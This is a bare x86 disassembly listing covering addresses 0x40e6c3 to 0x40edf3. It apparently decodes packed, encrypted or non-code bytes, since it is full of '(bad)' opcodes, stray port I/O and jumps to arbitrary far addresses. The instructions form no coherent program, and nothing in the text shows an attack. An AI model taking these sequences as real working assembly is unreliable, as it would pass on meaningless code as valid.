  40e6c3:	hlt    
  40e6c4:	or     dh,BYTE PTR [ebp-0x38641ff1]
  40e6ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6cb:	fcom   QWORD PTR [ebx+0x4e]
  40e6ce:	scas   eax,DWORD PTR es:[edi]
  40e6cf:	loop   0x40e67e
  40e6d1:	ror    BYTE PTR [ecx-0x1b],0x2a
  40e6d5:	add    bl,BYTE PTR [ecx+0x1a0f0c98]
  40e6db:	inc    edx
  40e6dc:	in     eax,dx
  40e6dd:	push   ecx
  40e6de:	(bad)  
  40e6df:	shl    bh,1
  40e6e1:	pop    esi
  40e6e2:	mov    es,eax
  40e6e4:	in     al,dx
  40e6e5:	pop    ecx
  40e6e6:	sub    eax,0xf1e6ad01
  40e6eb:	adc    al,0x5a
  40e6ed:	lods   al,BYTE PTR ds:[esi]
  40e6ee:	and    DWORD PTR [ebx+edi*2],0xb6241fb6
  40e6f5:	(bad)
  40e6f9:	shl    BYTE PTR [ebp-0x18e0dd02],cl
  40e6ff:	ret    
  40e700:	xchg   esp,eax
  40e701:	xor    BYTE PTR ds:0x97fcf7c1,ch
  40e707:	adc    dh,dh
  40e709:	jg     0x40e6c3
  40e70b:	xor    cl,BYTE PTR [edi-0x6]
  40e70e:	cmp    ch,bl
  40e710:	clc    
  40e711:	js     0x40e74e
  40e713:	cli    
  40e714:	sbb    BYTE PTR [edx],bl
  40e716:	adc    BYTE PTR [edx-0x3],0x70
  40e71a:	outs   dx,DWORD PTR ds:[esi]
  40e71b:	xchg   edi,eax
  40e71c:	xchg   ecx,eax
  40e71d:	or     al,0x8a
  40e71f:	das    
  40e720:	cmp    edi,DWORD PTR [ecx-0x15b2669d]
  40e726:	xlat   BYTE PTR ds:[ebx]
  40e727:	push   esp
  40e728:	retf   0x15a3
  40e72b:	mov    bl,0x45
  40e72d:	ja     0x40e785
  40e72f:	mov    ah,0xa
  40e731:	fisub  WORD PTR [ecx]
  40e733:	arpl   WORD PTR [eax+edi*2+0x6ab62363],di
  40e73a:	popa   
  40e73b:	inc    ecx
  40e73c:	xchg   ecx,eax
  40e73d:	dec    ebx
  40e73e:	loop   0x40e728
  40e740:	call   0xb017:0x4b4802a9
  40e747:	sub    bh,BYTE PTR [esi]
  40e749:	stos   BYTE PTR es:[edi],al
  40e74a:	ja     0x40e797
  40e74c:	test   dh,0x8d
  40e74f:	pextrw ecx,(bad),0xc5
  40e751:	dec    ebx
  40e752:	ret    0x27c8
  40e755:	ds or  eax,eax
  40e758:	add    dl,BYTE PTR [ebx]
  40e75a:	cmp    BYTE PTR [eax+eax*1+0x18f9fcc7],ch
  40e761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e762:	push   0x78ab0c0b
  40e767:	dec    ecx
  40e768:	je     0x40e7e5
  40e76a:	adc    ch,bh
  40e76c:	leave  
  40e76d:	test   al,0x1
  40e76f:	popa   
  40e770:	leave  
  40e771:	xor    BYTE PTR [ecx],dl
  40e773:	dec    ebp
  40e774:	ins    DWORD PTR es:[edi],dx
  40e775:	mov    fs,WORD PTR [esi-0x4d]
  40e778:	pop    eax
  40e779:	dec    esi
  40e77a:	test   BYTE PTR [esi-0xb],cl
  40e77d:	sti    
  40e77e:	cmp    eax,0x4837394a
  40e783:	or     bh,BYTE PTR [ebp-0x29]
  40e786:	mov    al,0x8f
  40e788:	lahf   
  40e789:	or     dl,BYTE PTR ds:0x9a0cf4c0
  40e78f:	hlt    
  40e790:	cmp    BYTE PTR [esi-0x48],ch
  40e793:	pop    esi
  40e794:	push   es
  40e795:	scas   eax,DWORD PTR es:[edi]
  40e796:	push   edi
  40e797:	sub    dl,BYTE PTR [edx]
  40e799:	dec    esp
  40e79a:	jmp    0x49ae:0x637f2e8e
  40e7a1:	and    edx,ecx
  40e7a3:	sub    bl,BYTE PTR [esi]
  40e7a5:	jle    0x40e7e5
  40e7a7:	fdivr  DWORD PTR [edi]
  40e7a9:	mov    bh,0x5f
  40e7ab:	xor    ah,BYTE PTR [edi-0x7b]
  40e7ae:	(bad)  
  40e7af:	jne    0x40e732
  40e7b1:	xchg   esp,eax
  40e7b2:	lods   eax,DWORD PTR ds:[esi]
  40e7b3:	jae    0x40e7f7
  40e7b5:	aam    0x60
  40e7b7:	xchg   edi,eax
  40e7b8:	lea    edi,es:[ebx-0x12952634]
  40e7bf:	inc    esp
  40e7c0:	cwde   
  40e7c1:	dec    eax
  40e7c2:	inc    ecx
  40e7c3:	into   
  40e7c4:	xor    bl,BYTE PTR [edi+0x5d]
  40e7c7:	cmp    BYTE PTR [ecx],0x99
  40e7ca:	nop
  40e7cb:	mov    esp,0x26609e6
  40e7d0:	test   BYTE PTR [ecx],0x8c
  40e7d3:	or     ebp,ebx
  40e7d5:	std    
  40e7d6:	push   ebx
  40e7d7:	lock or DWORD PTR [edx],0x1501e6ac
  40e7de:	aam    0xe3
  40e7e0:	cmp    dh,BYTE PTR [edx+0x1c]
  40e7e3:	imul   ecx,ebp,0xffffff84
  40e7e6:	nop
  40e7e7:	daa    
  40e7e8:	sbb    eax,0xeffb5253
  40e7ed:	mov    ah,0xd
  40e7ef:	pextrw esp,(bad),0xc5
  40e7f1:	lods   eax,DWORD PTR fs:[esi]
  40e7f3:	pop    ebp
  40e7f4:	dec    ecx
  40e7f5:	enter  0x7645,0xad
  40e7f9:	ds pop ebp
  40e7fb:	bound  edx,QWORD PTR [eax]
  40e7fd:	xor    bl,dh
  40e7ff:	mov    eax,0xd7c0f096
  40e804:	jecxz  0x40e817
  40e806:	inc    ecx
  40e807:	outs   dx,DWORD PTR ds:[esi]
  40e808:	and    dl,dh
  40e80a:	sub    al,0xa6
  40e80c:	fdiv   DWORD PTR [ebx+0x7a]
  40e80f:	jmp    0x514f:0x9bf31696
  40e816:	mov    bh,BYTE PTR [edi-0x5]
  40e819:	ror    edx,1
  40e81b:	xor    eax,0x483be327
  40e820:	icebp  
  40e821:	push   ss
  40e822:	xchg   esi,eax
  40e823:	pop    edx
  40e824:	pop    esp
  40e825:	dec    eax
  40e826:	or     dl,BYTE PTR [ebp-0x21]
  40e829:	xchg   edi,edi
  40e82b:	xor    DWORD PTR [edi+0x44],ebp
  40e82e:	xchg   edi,eax
  40e82f:	and    ebx,ecx
  40e831:	xchg   BYTE PTR [ebx-0x73],bh
  40e834:	mov    esp,0x8d30f93b
  40e839:	fstp   TBYTE PTR [ebp+0x72]
  40e83c:	dec    ecx
  40e83d:	bound  ebx,QWORD PTR [edx-0x70]
  40e840:	ins    DWORD PTR es:[edi],dx
  40e841:	xchg   ebx,eax
  40e842:	inc    esi
  40e843:	int3   
  40e844:	cmp    al,0x42
  40e846:	(bad)
  40e849:	add    eax,edx
  40e84b:	push   ds
  40e84c:	push   ss
  40e84d:	cli    
  40e84e:	inc    eax
  40e84f:	push   edx
  40e850:	mov    edx,ebx
  40e852:	ret    
  40e853:	pop    esi
  40e854:	sahf   
  40e855:	test   DWORD PTR [ebx+0x5],ebx
  40e858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e859:	retf   
  40e85a:	stc    
  40e85b:	mov    ecx,0x42df4e88
  40e860:	mov    ah,0x8a
  40e862:	sar    DWORD PTR [esi-0x13c287f2],cl
  40e868:	stc    
  40e869:	jg     0x40e860
  40e86b:	daa    
  40e86c:	loopne 0x40e872
  40e86e:	cld    
  40e86f:	ror    BYTE PTR [ecx+0x41e072a6],cl
  40e875:	stos   BYTE PTR es:[edi],al
  40e876:	je     0x40e88b
  40e878:	in     al,dx
  40e879:	and    BYTE PTR [esi-0x6f],ch
  40e87c:	jmp    0xe2a:0x2294098e
  40e883:	test   BYTE PTR [edi+0x2b],cl
  40e886:	dec    edx
  40e887:	jecxz  0x40e858
  40e889:	jl     0x40e8ce
  40e88b:	sub    bl,BYTE PTR [edx+0x3552b9b6]
  40e891:	adc    eax,0x16525800
  40e896:	imul   esi,DWORD PTR [esi],0xbeb85e56
  40e89c:	ins    DWORD PTR es:[edi],dx
  40e89d:	repz pop eax
  40e89f:	idiv   BYTE PTR [ebx+esi*8+0x55]
  40e8a3:	inc    eax
  40e8a4:	mov    WORD PTR [eax+ebp*1+0xfa07bb9],?
  40e8ab:	or     eax,0x46b246c4
  40e8b0:	arpl   WORD PTR [edx+0x26d15a9],bx
  40e8b6:	jo     0x40e904
  40e8b8:	lea    eax,[edx]
  40e8ba:	add    DWORD PTR [ecx],ebp
  40e8bc:	and    DWORD PTR [ecx-0x57],ebp
  40e8bf:	and    al,BYTE PTR [eax-0x3e]
  40e8c2:	cmp    al,0x1f
  40e8c4:	adc    esi,ebp
  40e8c6:	jmp    0x40e8b4
  40e8c8:	fsubr  DWORD PTR [edi]
  40e8ca:	js     0x40e900
  40e8cc:	sub    ebx,DWORD PTR ds:0x9b99026d
  40e8d2:	or     DWORD PTR [eax-0x6727d398],esp
  40e8d8:	jmp    0x40e884
  40e8da:	fsubr  DWORD PTR [edx+0xc]
  40e8dd:	fimul  WORD PTR [ecx]
  40e8df:	dec    esp
  40e8e0:	add    esp,ecx
  40e8e2:	mov    eax,0x4997167f
  40e8e7:	mov    ebx,edx
  40e8e9:	ret    
  40e8ea:	js     0x40e968
  40e8ec:	fwait
  40e8ed:	pop    edx
  40e8ee:	sbb    esi,esp
  40e8f0:	sahf   
  40e8f1:	pop    es
  40e8f2:	rcr    BYTE PTR [ecx],0xa3
  40e8f5:	mov    esi,0x9a07f529
  40e8fa:	push   es
  40e8fb:	pusha  
  40e8fc:	sbb    di,dx
  40e8ff:	fwait
  40e900:	sbb    BYTE PTR [ecx+0x357c10e7],dl
  40e906:	stos   DWORD PTR es:[edi],eax
  40e907:	jl     0x40e90b
  40e909:	sbb    DWORD PTR [ebx-0x4edc86bd],edi
  40e90f:	cld    
  40e910:	xor    BYTE PTR [edi],al
  40e912:	mov    ds,esp
  40e914:	sbb    BYTE PTR [esi-0x57],0x6d
  40e918:	mov    WORD PTR [esi-0x221b9bf8],?
  40e91e:	ror    eax,1
  40e920:	(bad)  
  40e921:	cvtdq2ps xmm6,XMMWORD PTR [ebx-0x66572a99]
  40e928:	or     ebx,DWORD PTR [eax-0x6a]
  40e92b:	adc    eax,eax
  40e92d:	jb     0x40e981
  40e92f:	push   edx
  40e930:	xor    eax,0xd716ae15
  40e935:	add    eax,0x1b629fc4
  40e93a:	popf   
  40e93b:	sbb    BYTE PTR [ecx],cl
  40e93d:	and    eax,0x6252f7f
  40e942:	lods   al,BYTE PTR ds:[esi]
  40e943:	aam    0x46
  40e945:	fxch   st(0)
  40e947:	sti    
  40e948:	pop    es
  40e949:	(bad)  
  40e94a:	or     ecx,DWORD PTR [esi-0x3e]
  40e94d:	inc    esp
  40e94e:	ss lahf 
  40e950:	push   es
  40e951:	dec    ebp
  40e952:	push   eax
  40e953:	pop    eax
  40e954:	shr    BYTE PTR [edi+0x7f],1
  40e957:	stos   BYTE PTR es:[edi],al
  40e958:	xor    al,0x15
  40e95a:	pop    es
  40e95b:	inc    edx
  40e95c:	pop    es
  40e95d:	std    
  40e95e:	cmp    al,0xcd
  40e960:	jge    0x40e9dd
  40e962:	sbb    esi,DWORD PTR [esi+edx*2]
  40e965:	sub    al,0x17
  40e967:	add    ebp,edi
  40e969:	mov    ds:0xc39131de,eax
  40e96e:	cdq    
  40e96f:	(bad)  
  40e970:	cld    
  40e971:	fcom   QWORD PTR [edi]
  40e973:	fsubr  QWORD PTR [ecx-0x2ae68529]
  40e979:	mov    ebx,0xf9c5df37
  40e97e:	cmc    
  40e97f:	fisubr WORD PTR [eax-0x78]
  40e982:	inc    esp
  40e983:	add    BYTE PTR [esi],0xce
  40e986:	cmp    bl,0x98
  40e989:	jmp    0x58c911c6
  40e98e:	sbb    al,0x30
  40e990:	push   eax
  40e991:	sbb    bh,dh
  40e993:	scas   eax,DWORD PTR es:[edi]
  40e994:	cmp    DWORD PTR [edi+0x239b01],ecx
  40e99a:	mov    ds:0x7b971ccf,eax
  40e99f:	lock sub DWORD PTR [edx-0x45],edx
  40e9a3:	xor    ecx,DWORD PTR [edi+esi*2]
  40e9a6:	enter  0x8f1,0x1b
  40e9aa:	push   edx
  40e9ab:	mov    ebx,0x5145e17d
  40e9b0:	add    eax,0x6309707a
  40e9b5:	adc    edx,esi
  40e9b7:	xchg   edx,eax
  40e9b8:	scas   al,BYTE PTR es:[edi]
  40e9b9:	fstp   QWORD PTR [eax]
  40e9bb:	pop    esi
  40e9bc:	pusha  
  40e9bd:	enter  0x75e5,0x98
  40e9c1:	pop    eax
  40e9c2:	loop   0x40e95c
  40e9c4:	repz jns 0x40ea09
  40e9c7:	xorps  xmm5,xmm2
  40e9ca:	adc    esp,edi
  40e9cc:	shr    BYTE PTR [eax+0x4a],1
  40e9cf:	cwde   
  40e9d0:	pop    ss
  40e9d1:	push   ds
  40e9d2:	lods   eax,DWORD PTR ds:[esi]
  40e9d3:	push   0x58
  40e9d5:	and    edx,eax
  40e9d7:	lods   al,BYTE PTR ds:[esi]
  40e9d8:	and    ebp,DWORD PTR [edi-0x77]
  40e9db:	aas    
  40e9dc:	imul   ebx,DWORD PTR [esi],0x94ab5c1
  40e9e2:	mov    ch,BYTE PTR [edi]
  40e9e4:	popf   
  40e9e5:	inc    esp
  40e9e6:	imul   edx,eax,0xffffffbf
  40e9e9:	adc    ebp,DWORD PTR [ecx+0x2a]
  40e9ec:	mov    fs,edi
  40e9ee:	jno    0x40e977
  40e9f0:	sar    bh,0x43
  40e9f3:	stc    
  40e9f4:	mov    ecx,0x30aa47c4
  40e9f9:	mov    eax,0x415a1dcd
  40e9fe:	leave  
  40e9ff:	push   DWORD PTR [ecx+0x21218488]
  40ea05:	pop    esp
  40ea06:	aam    0xd3
  40ea08:	dec    eax
  40ea09:	mov    edx,0x8353b4b6
  40ea0e:	ret    0x17da
  40ea11:	pop    ebp
  40ea12:	lds    esp,FWORD PTR [ecx+0x3d]
  40ea15:	sbb    al,BYTE PTR [edi+0x1]
  40ea18:	ficom  DWORD PTR [esi+0x47702d27]
  40ea1e:	pop    esp
  40ea1f:	jno    0x40e9fc
  40ea21:	fld    st(1)
  40ea23:	hlt    
  40ea24:	pop    eax
  40ea25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea26:	mov    WORD PTR [eax],ss
  40ea28:	cmc    
  40ea29:	sar    BYTE PTR [ecx-0x40519f6b],cl
  40ea2f:	cs call 0xd58810ec
  40ea35:	dec    ebp
  40ea36:	or     bl,dh
  40ea38:	lea    ebx,[eax+0x264989f7]
  40ea3e:	call   0x80b7:0x9d415a9c
  40ea45:	push   es
  40ea46:	dec    eax
  40ea47:	mov    ds,WORD PTR [edx+0x57]
  40ea4a:	fld    DWORD PTR [ecx]
  40ea4c:	out    dx,al
  40ea4d:	push   ds
  40ea4e:	and    ah,BYTE PTR ds:0xa0a2483
  40ea54:	mov    bl,0x29
  40ea56:	xchg   ebp,eax
  40ea57:	jl     0x40ea5f
  40ea59:	into   
  40ea5a:	fwait
  40ea5b:	cwde   
  40ea5c:	das    
  40ea5d:	mov    eax,ds:0x92f20b12
  40ea62:	add    DWORD PTR [ecx+0x69],edx
  40ea65:	pop    ebx
  40ea66:	sub    esp,ebx
  40ea68:	aam    0xa2
  40ea6a:	push   ss
  40ea6b:	pop    eax
  40ea6c:	xor    BYTE PTR [ebp-0x456474ea],bl
  40ea72:	in     eax,0x47
  40ea74:	jmp    0xc577a3cc
  40ea79:	dec    esi
  40ea7a:	inc    edi
  40ea7b:	in     eax,0x8e
  40ea7d:	in     eax,dx
  40ea7e:	push   ecx
  40ea7f:	test   al,0x7a
  40ea81:	stc    
  40ea82:	and    al,0xaa
  40ea84:	ins    BYTE PTR es:[edi],dx
  40ea85:	sub    eax,0xf5f41e8c
  40ea8a:	(bad)  
  40ea8b:	rol    DWORD PTR [eax+esi*1],0xa4
  40ea8f:	push   0xbe5b5a7d
  40ea94:	jge    0x40ea84
  40ea96:	cdq    
  40ea97:	xlat   BYTE PTR ds:[ebx]
  40ea98:	and    bl,dl
  40ea9a:	ret    0x27bc
  40ea9d:	dec    esi
  40ea9e:	jmp    0x40ead4
  40eaa0:	jne    0x40eae4
  40eaa2:	xchg   DWORD PTR [edx+ebx*1-0x16],eax
  40eaa6:	jle    0x40eaa8
  40eaa8:	jne    0x40eb1a
  40eaaa:	cli    
  40eaab:	in     eax,0xc
  40eaad:	and    DWORD PTR [ecx+ebp*1],edi
  40eab0:	test   eax,0x8e62a6d4
  40eab5:	fdivr  QWORD PTR [edi]
  40eab7:	adc    DWORD PTR [ecx],ebp
  40eab9:	mov    bl,0x37
  40eabb:	jp     0x40eb31
  40eabd:	repz xor dh,BYTE PTR [eax+0xbdc35bc]
  40eac4:	dec    ebp
  40eac5:	scas   eax,DWORD PTR es:[edi]
  40eac6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eac7:	data16 add dh,BYTE PTR [eax]
  40eaca:	jmp    0x6399c99c
  40eacf:	ss push ebx
  40ead1:	ins    DWORD PTR es:[edi],dx
  40ead2:	inc    edx
  40ead3:	imul   ebp,DWORD PTR [edx+eiz*4],0x49
  40ead7:	sahf   
  40ead8:	pop    eax
  40ead9:	loop   0x40eb4e
  40eadb:	stos   BYTE PTR es:[edi],al
  40eadc:	icebp  
  40eadd:	mov    eax,0x76d32a38
  40eae2:	push   ebp
  40eae3:	enter  0xddaf,0xbe
  40eae7:	pop    ebp
  40eae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eae9:	pop    esi
  40eaea:	(bad)  
  40eaec:	push   ecx
  40eaed:	push   edx
  40eaee:	stc    
  40eaef:	sbb    DWORD PTR [ecx],ecx
  40eaf1:	aam    0xca
  40eaf3:	rcr    BYTE PTR ds:0x5ef11b56,1
  40eaf9:	ds dec edi
  40eafb:	cmp    edx,DWORD PTR [eax+0x43]
  40eafe:	lds    esi,FWORD PTR [ebp-0x5f]
  40eb01:	retf   0xed24
  40eb04:	xor    cl,BYTE PTR [edx]
  40eb06:	lods   eax,DWORD PTR ds:[esi]
  40eb07:	dec    edi
  40eb08:	push   ss
  40eb09:	loop   0x40eae9
  40eb0b:	cmp    eax,ebp
  40eb0d:	fld    TBYTE PTR [ecx]
  40eb0f:	shl    BYTE PTR ds:0x706441c6,0xfb
  40eb16:	adc    DWORD PTR [ebp-0x2],edx
  40eb19:	sti    
  40eb1a:	ret    
  40eb1b:	(bad)  
  40eb1c:	stos   DWORD PTR es:[edi],eax
  40eb1d:	mov    bh,0xab
  40eb1f:	fsubr  DWORD PTR [eax+0x76886b24]
  40eb25:	xor    al,BYTE PTR [eax+0x3e]
  40eb28:	ins    DWORD PTR es:[edi],dx
  40eb29:	daa    
  40eb2a:	xchg   edi,eax
  40eb2b:	add    eax,0xdf3f790
  40eb30:	mov    BYTE PTR [ebx+0x1e314af9],0x5e
  40eb37:	and    al,0xe
  40eb39:	cmc    
  40eb3a:	stc    
  40eb3b:	or     BYTE PTR [edi-0x1e900a0a],ah
  40eb41:	leave  
  40eb42:	and    eax,0xd22525c8
  40eb47:	or     al,0x2c
  40eb49:	jge    0x40ebc0
  40eb4b:	mov    ecx,0xa98802b
  40eb50:	sub    edi,DWORD PTR [ecx+0x670427b3]
  40eb56:	cwde   
  40eb57:	jecxz  0x40eb64
  40eb59:	or     al,0xed
  40eb5b:	xchg   edx,eax
  40eb5c:	scas   eax,DWORD PTR es:[edi]
  40eb5d:	sbb    dl,al
  40eb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb60:	cmc    
  40eb61:	fadd   st,st(4)
  40eb63:	enter  0x4177,0x84
  40eb67:	or     DWORD PTR [esi-0x384b2e74],ecx
  40eb6d:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb6f:	xor    al,0x7c
  40eb71:	repnz sbb eax,0xb5f3d02c
  40eb77:	push   esi
  40eb78:	pop    ebp
  40eb79:	sub    esp,0xffffffb2
  40eb7c:	ficomp DWORD PTR [edx]
  40eb7e:	or     DWORD PTR [esi-0x7e39ea23],ecx
  40eb84:	pop    ds
  40eb85:	int3   
  40eb86:	popf   
  40eb87:	adc    al,0xec
  40eb89:	les    ecx,FWORD PTR [ebp+0x3a]
  40eb8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8d:	inc    ebx
  40eb8e:	mov    eax,ds:0xbeac6959
  40eb93:	lahf   
  40eb94:	jno    0x40ebc7
  40eb96:	dec    esi
  40eb97:	sub    BYTE PTR [edx+0x1f7aca52],bl
  40eb9d:	js     0x40eb45
  40eb9f:	mov    ds,ebp
  40eba1:	loope  0x40ebc9
  40eba3:	or     dl,cl
  40eba5:	sbb    BYTE PTR [edi],ch
  40eba7:	pusha  
  40eba8:	pusha  
  40eba9:	cmp    ch,al
  40ebab:	fnsave [edi-0x8]
  40ebae:	push   DWORD PTR [ebx]
  40ebb0:	dec    edi
  40ebb1:	mov    ebx,DWORD PTR [edi+eax*2]
  40ebb4:	sbb    DWORD PTR [edi+edi*8-0x5],ecx
  40ebb8:	cld    
  40ebb9:	jg     0x40eb8d
  40ebbb:	mov    eax,ds:0x76ecf0eb
  40ebc0:	mov    dl,0x9b
  40ebc2:	mov    WORD PTR [ebp-0x553ef29],ss
  40ebc8:	push   0x20bde820
  40ebcd:	add    cl,BYTE PTR [eax-0x3a0a264d]
  40ebd3:	loope  0x40eb60
  40ebd5:	hlt    
  40ebd6:	(bad)  
  40ebd8:	ss out dx,al
  40ebda:	sbb    BYTE PTR [edi+0x673b0f1f],0x1f
  40ebe1:	repz jecxz 0x40ec2d
  40ebe4:	mov    eax,ds:0xaffe3736
  40ebe9:	push   eax
  40ebea:	sub    al,0xa7
  40ebec:	mov    ch,0xe4
  40ebee:	and    BYTE PTR [ebx],ch
  40ebf0:	push   esp
  40ebf1:	jb     0x40ec04
  40ebf3:	and    BYTE PTR [ecx-0x66],0xd9
  40ebf7:	mov    bh,0x59
  40ebf9:	fbld   TBYTE PTR [esi]
  40ebfb:	ja     0x40ec64
  40ebfd:	mov    cl,0xee
  40ebff:	pop    ecx
  40ec00:	paddsw mm3,QWORD PTR [edi]
  40ec03:	sub    DWORD PTR [edi+0xf],0xcce162c4
  40ec0a:	jb     0x40ec3d
  40ec0c:	sbb    WORD PTR [ecx],si
  40ec0f:	add    al,0x8d
  40ec11:	mov    ebx,DWORD PTR [ecx]
  40ec13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec14:	ret    0x34c1
  40ec17:	jno    0x40ec18
  40ec19:	test   BYTE PTR [eax-0x43],bl
  40ec1c:	mov    dh,0x75
  40ec1e:	je     0x40ec8e
  40ec20:	pop    ds
  40ec21:	pop    ss
  40ec22:	jnp    0x40ebc7
  40ec24:	or     eax,0xd723b181
  40ec29:	push   esp
  40ec2a:	push   es
  40ec2b:	jno    0x40eca1
  40ec2d:	jg     0x40ec60
  40ec2f:	lock or DWORD PTR [esi],0x5c
  40ec33:	dec    edx
  40ec34:	xchg   edi,eax
  40ec35:	mov    ebp,0xfc2eeb8
  40ec3a:	clc    
  40ec3b:	cmp    eax,0x7e86b192
  40ec40:	in     al,0x4d
  40ec42:	int    0x36
  40ec44:	adc    bh,cl
  40ec46:	mov    dl,0xff
  40ec48:	or     DWORD PTR [edx-0x3c159228],0xc
  40ec4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec50:	in     eax,0x27
  40ec52:	nop
  40ec53:	push   0x428500c3
  40ec58:	or     bh,BYTE PTR [esi-0x6a1aa741]
  40ec5e:	mov    ah,0x2e
  40ec60:	(bad)  [edi+ecx*4+0x59]
  40ec64:	jnp    0x40ec97
  40ec66:	push   edi
  40ec67:	fldcw  WORD PTR [ecx+0x32]
  40ec6a:	push   cs
  40ec6b:	ret    
  40ec6c:	call   0x5d9b:0x82cdbc98
  40ec73:	mov    cl,0x44
  40ec75:	fiadd  DWORD PTR [ecx]
  40ec77:	pushf  
  40ec78:	sar    BYTE PTR [eax+esi*2+0x0],1
  40ec7c:	jmp    0x40ece5
  40ec7e:	mov    esi,0xb33728ef
  40ec83:	jns    0x40ec05
  40ec85:	mov    esp,0x1e48699f
  40ec8a:	test   eax,0x11e8b064
  40ec8f:	lods   eax,DWORD PTR ds:[esi]
  40ec90:	sub    BYTE PTR [eax+0x6d],bl
  40ec93:	jne    0x40ecf3
  40ec95:	sbb    DWORD PTR [ecx+0x2591c64e],ecx
  40ec9b:	pop    ecx
  40ec9c:	rcr    BYTE PTR [esi],1
  40ec9e:	sbb    al,0x67
  40eca0:	and    bh,ch
  40eca2:	repnz (bad) 
  40eca4:	loop   0x40ece6
  40eca6:	or     esi,DWORD PTR [ecx-0x6b]
  40eca9:	cmp    cl,BYTE PTR [ebp-0x4d6bf140]
  40ecaf:	mov    ebx,0x212ef326
  40ecb4:	mov    dh,0x25
  40ecb6:	fisttp QWORD PTR [ecx-0x40b3c39b]
  40ecbc:	push   ebx
  40ecbd:	repz mov dh,0xba
  40ecc0:	data16 stos BYTE PTR es:[edi],al
  40ecc2:	popf   
  40ecc3:	popa   
  40ecc4:	add    eax,0xffffffdf
  40ecc7:	or     DWORD PTR [ecx+0x2e],ebp
  40ecca:	pusha  
  40eccb:	iret   
  40eccc:	(bad)  
  40eccd:	pop    eax
  40ecce:	retf   0x221b
  40ecd1:	xchg   esi,eax
  40ecd2:	ror    DWORD PTR [esi],1
  40ecd4:	test   DWORD PTR [ebp-0x1bc9be1],ecx
  40ecda:	imul   edx,DWORD PTR [esp+ecx*1+0x213038f7],0xbaa6f424
  40ece5:	sbb    al,0x31
  40ece7:	and    bh,BYTE PTR [ebx+0x61662e0c]
  40eced:	push   eax
  40ecee:	or     DWORD PTR [ebx-0x286c6927],esp
  40ecf4:	xchg   ebp,eax
  40ecf5:	lds    esi,FWORD PTR [ebp+0x39]
  40ecf8:	mov    bl,0x1d
  40ecfa:	adc    BYTE PTR [ebp+eiz*8-0x29badb09],0x32
  40ed02:	test   BYTE PTR [ebx-0xfc9ba6f],0xed
  40ed09:	and    BYTE PTR [esi-0x4e],0xf7
  40ed0d:	scas   al,BYTE PTR es:[edi]
  40ed0e:	out    dx,eax
  40ed0f:	js     0x40ed84
  40ed11:	es ja  0x40ed27
  40ed14:	pusha  
  40ed15:	sbb    BYTE PTR [eax-0x7536b68d],al
  40ed1b:	push   ds
  40ed1c:	jle    0x40ed9b
  40ed1e:	adc    al,0xf5
  40ed20:	imul   esi,ebp,0xffffffc3
  40ed23:	ficomp WORD PTR [edi+esi*2+0x17]
  40ed27:	add    al,BYTE PTR [edi+0x26]
  40ed2a:	mov    eax,ds:0x1d761413
  40ed2f:	stc    
  40ed30:	push   ecx
  40ed31:	adc    al,0x82
  40ed33:	xor    edi,DWORD PTR [edi-0x8cc2c6f]
  40ed39:	mov    bh,0x66
  40ed3b:	adc    al,0xb7
  40ed3d:	test   al,0x6d
  40ed3f:	jo     0x40ed40
  40ed41:	xchg   ecx,eax
  40ed42:	lock mov esi,0xffd3626
  40ed48:	aad    0x7f
  40ed4a:	aad    0x1e
  40ed4c:	fld    DWORD PTR [edi-0x25839215]
  40ed52:	xor    ecx,edi
  40ed54:	test   al,0x8c
  40ed56:	mov    esi,0xf7a6df29
  40ed5b:	or     edx,DWORD PTR [edi-0x6f]
  40ed5e:	dec    esi
  40ed5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed60:	cmp    eax,0xa1523334
  40ed65:	je     0x40eda4
  40ed67:	xchg   ebx,eax
  40ed68:	push   ss
  40ed69:	sbb    DWORD PTR [ebx-0x71],edx
  40ed6c:	cmp    cl,BYTE PTR [eax-0x3a]
  40ed6f:	test   bh,dh
  40ed71:	into   
  40ed72:	fmul   QWORD PTR [edi-0x20]
  40ed75:	stc    
  40ed76:	les    eax,FWORD PTR [edi-0x65]
  40ed79:	push   0xd08c602
  40ed7e:	pop    esi
  40ed7f:	pop    edi
  40ed80:	jmp    0x26a9:0x812e3031
  40ed87:	mov    dh,0x86
  40ed89:	adc    DWORD PTR [esi-0x5feb0c48],ebx
  40ed8f:	mov    ebx,0xd2787990
  40ed94:	nop
  40ed95:	inc    esi
  40ed96:	repz in eax,0x52
  40ed99:	xor    al,0xab
  40ed9b:	(bad)  
  40ed9c:	jae    0x40ee03
  40ed9e:	aas    
  40ed9f:	sbb    eax,0x9c00930e
  40eda4:	push   es
  40eda5:	stos   BYTE PTR es:[edi],al
  40eda6:	ror    DWORD PTR [ecx],cl
  40eda8:	stc    
  40eda9:	(bad)  
  40edab:	pusha  
  40edac:	cli    
  40edad:	aam    0x34
  40edaf:	retf   
  40edb0:	test   al,0xee
  40edb2:	fidiv  WORD PTR [ebx*2+0x2628c531]
  40edb9:	pop    esp
  40edba:	std    
  40edbb:	jne    0x40ed60
  40edbd:	xor    BYTE PTR [ebp-0x166a3d7a],cl
  40edc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edc4:	sub    eax,0x5786ff
  40edc9:	xchg   esi,eax
  40edca:	and    ecx,DWORD PTR [ebx+0x61]
  40edcd:	xchg   edi,eax
  40edce:	dec    edx
  40edcf:	repz dec edi
  40edd1:	add    BYTE PTR [edi],0xdd
  40edd4:	ss or  eax,0xd8269c27
  40edda:	fsubr  DWORD PTR [ecx]
  40eddc:	(bad)  
  40eddd:	jl     0x40ee4a
  40eddf:	or     DWORD PTR [eax-0x4e320b05],edx
  40ede5:	sbb    ebx,ecx
  40ede7:	popf   
  40ede8:	inc    esi
  40ede9:	jns    0x40ed7e
  40edeb:	mov    al,ds:0xd81c5633
  40edf0:	mov    ch,0x9a
  40edf2:	out    dx,al
  40edf3:	fs mov edx,0x6cbec552
